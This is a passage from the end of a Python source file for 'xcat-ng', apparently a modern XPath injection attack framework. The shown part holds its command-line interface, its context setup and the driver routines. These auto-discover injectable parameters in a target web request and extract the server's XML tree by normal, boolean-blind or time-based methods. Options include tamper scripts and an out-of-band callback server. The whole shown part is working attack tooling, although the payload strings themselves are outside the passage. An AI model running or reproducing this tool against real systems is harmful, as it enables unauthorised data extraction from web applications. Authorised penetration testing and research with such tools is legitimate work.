            ctx.injector     = inj
            feats = await detect_features(engine)
            ctx.features.update(feats)
        else:
            print(red("No injection detected in any parameter."))
    finally:
        await ctx.close()


async def run_discover(ctx: AttackContext, state: State):
    """Auto-discover + extract."""
    engine = Engine(ctx)
    await ctx.start()
    try:
        print("[*] Building baseline...")
        baseline_bodies = await build_baseline(engine)

        print("[*] Auto-discovering injection points...")
        result = await auto_discover(engine, baseline_bodies)

        if not result:
            print(red("No injection found. Exiting."))
            return

        param, method, inj = result
        print(f"\n{bold('Found:')} {green(param)} via {yellow(inj.name)} ({method.value})")

        ctx.target_param = param
        ctx.injector     = inj

        print("\n[*] Detecting features...")
        feats = await detect_features(engine)
        ctx.features.update(feats)

        if method == ExtractionMethod.NORMAL:
            print("\n[*] Attempting NORMAL extraction...")
            val = await extract_normal(engine, param, inj)
            if val:
                print(f"\n{bold('Extracted:')}\n{val}")
            else:
                print(yellow("NORMAL extraction found nothing. Falling back to boolean..."))
                method = ExtractionMethod.BOOLEAN

        if method == ExtractionMethod.BOOLEAN:
            print("\n[*] Extracting root node name (boolean)...")
            root_name = await get_string_boolean(engine, "name(/*)", ctx.fast_mode)
            print(f"Root node: {green(root_name)}")
            state.data["root_name"] = root_name
            state.save()

            print("\n[*] BFS XML traversal...")
            nodes = await get_nodes_bfs(engine, "/*")
            print()
            print_xml_tree(nodes)

        elif method == ExtractionMethod.TIME:
            # threshold estimation
            print("\n[*] Estimating time threshold...")
            times = []
            for _ in range(5):
                _, _, t = await engine.send_raw({})
                times.append(t)
            mean_base = statistics.mean(times)
            threshold = mean_base + 3.0
            print(f"Threshold: {threshold:.2f}s")

            print("\n[*] Extracting root node name (time-based)...")
            root_name = await get_string_time(engine, "name(/*)", threshold, ctx.fast_mode)
            print(f"Root node: {green(root_name)}")

    finally:
        await ctx.close()

# ─────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="xcat-ng",
        description="Modern XPath Injection Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    sub = p.add_subparsers(dest="command", required=True)

    # shared options
    def add_common(sp):
        g = sp.add_argument_group("Request")
        g.add_argument("-r", "--request",    help="Burp-style raw HTTP request file")
        g.add_argument("--url",              help="Target URL (alternative to -r)")
        g.add_argument("--method",           default="GET")
        g.add_argument("--param",            help="Target parameter name")
        g.add_argument("--param-value",      help="Normal value of target parameter", default="")
        g.add_argument("--extra-param", nargs="*", metavar="K=V",
                       help="Additional parameters (key=value)")
        g.add_argument("--header",  nargs="*", metavar="K:V")
        g.add_argument("--body-param", nargs="*", metavar="K=V")

        g2 = sp.add_argument_group("Oracle")
        g2.add_argument("--true-string",  help="String that indicates TRUE response")
        g2.add_argument("--false-string", help="String that indicates FALSE response")
        g2.add_argument("--true-code",    type=int, help="HTTP status for TRUE")
        g2.add_argument("--false-code",   type=int, help="HTTP status for FALSE")

        g3 = sp.add_argument_group("Options")
        g3.add_argument("--mode",        choices=["safe", "aggressive"], default="safe")
        g3.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY)
        g3.add_argument("--fast",        action="store_true")
        g3.add_argument("--timeout",     type=int, default=DEFAULT_TIMEOUT)
        g3.add_argument("--proxy",       help="HTTP proxy (e.g. http://127.0.0.1:8080)")
        g3.add_argument("--resume",      help="Resume state JSON file")
        g3.add_argument("--tamper",      help="Path to tamper.py (must export tamper(ctx,args))")
        g3.add_argument("--oob",         help="host:port for OOB server (requires aiohttp)")
        g3.add_argument("--enable",      nargs="*", help="Force-enable features")
        g3.add_argument("--disable",     nargs="*", help="Force-disable features")

    for name in ("run", "shell", "detect", "discover"):
        sp = sub.add_parser(name, help={
            "run":      "Extract full XML tree",
            "shell":    "Interactive XCat shell",
            "detect":   "Detect injection points and features",
            "discover": "Auto-discover injection and extract",
        }[name])
        add_common(sp)
        if name == "discover":
            sp.add_argument("--patterns", nargs="*", help="Regex patterns for NORMAL extraction")

    return p


def _parse_kv(items, sep="=") -> Dict[str, str]:
    out = {}
    for item in (items or []):
        if sep in item:
            k, v = item.split(sep, 1)
            out[k.strip()] = v.strip()
    return out


def build_ctx(args) -> Tuple[AttackContext, State]:
    # --- Parse request ---
    if args.request:
        req = ParsedRequest.from_burp(args.request)
    elif args.url:
        headers    = {}
        for h in (args.header or []):
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()
        extra_params = _parse_kv(args.extra_param or [])
        if args.param:
            extra_params[args.param] = args.param_value or ""
        body = _parse_kv(args.body_param or [])
        req = ParsedRequest.from_args(
            url=args.url, method=args.method,
            params=extra_params, headers=headers, body=body,
        )
    else:
        sys.exit("Either -r/--request or --url is required.")

    # --- Identify target param ---
    target_param = getattr(args, "param", None)
    if not target_param:
        all_params = req.all_params
        if len(all_params) == 1:
            target_param = next(iter(all_params))
        else:
            target_param = next(iter(all_params), "")

    # --- Match function ---
    if not any([args.true_string, args.false_string, args.true_code, args.false_code]):
        sys.exit("At least one of --true-string / --false-string / --true-code / --false-code required.")

    match_fn = make_match_fn(
        true_string=args.true_string,
        false_string=args.false_string,
        true_code=args.true_code,
        false_code=args.false_code,
    )

    # --- Tamper ---
    tamper_fn = None
    if getattr(args, "tamper", None):
        spec   = importlib.util.spec_from_file_location("tamper", args.tamper)
        mod    = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        tamper_fn = getattr(mod, "tamper", None)

    # --- OOB ---
    oob_host = None
    if getattr(args, "oob", None):
        oob_host = args.oob  # "host:port"

    state = State(getattr(args, "resume", None))

    ctx = AttackContext(
        req=req,
        target_param=target_param,
        match_fn=match_fn,
        mode=Mode(args.mode),
        concurrency=args.concurrency,
        fast_mode=args.fast,
        injector=None,
        tamper_fn=tamper_fn,
        oob_host=oob_host,
        timeout=args.timeout,
        proxy=args.proxy,
    )

    for feat in (getattr(args, "enable", None) or []):
        ctx.features[feat] = True
    for feat in (getattr(args, "disable", None) or []):
        ctx.features[feat] = False

    return ctx, state


async def async_main(args):
    ctx, state = build_ctx(args)

    cmd = args.command
    if cmd == "run":
        # Auto-detect injection first
        engine = Engine(ctx)
        await ctx.start()
        try:
            print("[*] Building baseline...")
            baseline = await build_baseline(engine)
            print("[*] Auto-discovering injection...")
            result = await auto_discover(engine, baseline)
            if result:
                param, method, inj = result
                ctx.target_param = param
                ctx.injector     = inj
            print("[*] Detecting features...")
            feats = await detect_features(engine)
            ctx.features.update(feats)
            print("\n[*] Extracting XML tree (BFS)...")
            nodes = await get_nodes_bfs(engine, state.data.get("root_expr", "/*"))
            print()
            print_xml_tree(nodes)
        finally:
            await ctx.close()

    elif cmd == "shell":
        engine = Engine(ctx)
        await ctx.start()
        try:
            print("[*] Building baseline...")
            baseline = await build_baseline(engine)
            print("[*] Auto-discovering injection...")
            result = await auto_discover(engine, baseline)
            if result:
                param, method, inj = result
                ctx.target_param = param
                ctx.injector     = inj
            print("[*] Detecting features...")
            feats = await detect_features(engine)
            ctx.features.update(feats)
            shell = Shell(engine)
            await shell.run()
        finally:
            await ctx.close()

    elif cmd == "detect":
        await run_detect(ctx)

    elif cmd == "discover":
        await run_discover(ctx, state)


def main():
    parser = build_parser()
    args   = parser.parse_args()
    try:
        asyncio.run(async_main(args))
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")


if __name__ == "__main__":
    main()
